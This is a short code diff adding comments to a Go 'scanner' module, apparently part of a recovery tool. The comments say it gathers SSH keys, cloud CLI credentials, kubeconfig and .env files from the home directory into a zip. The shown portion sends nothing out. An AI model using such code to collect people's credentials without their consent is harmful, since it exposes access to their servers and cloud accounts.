@@ -1,3 +1,7 @@
+// keys.go — harvest SSH keys, cloud CLI credentials, kubeconfig, and .env files.
+//
+// Results are metadata + small file contents (capped by maxKeyFileSize).
+// .env hits are also promoted into the primary zip under env/ by export_files.
 package scanner
 
 import (
@@ -8,12 +12,13 @@ import (
 	"recovery/recovery/types"
 )
 
-const maxKeyFileSize = 512 * 1024 // 512KB
+const maxKeyFileSize = 512 * 1024 // 512KB — skip huge accidental matches
 
 func gcpConfigDir(home string) string {
 	return filepath.Join(home, ".config", "gcloud")
 }
 
+// ScanKeys walks well-known credential locations under the user home directory.
 func ScanKeys() []types.KeyResult {
 	var results []types.KeyResult
 	home, _ := os.UserHomeDir()
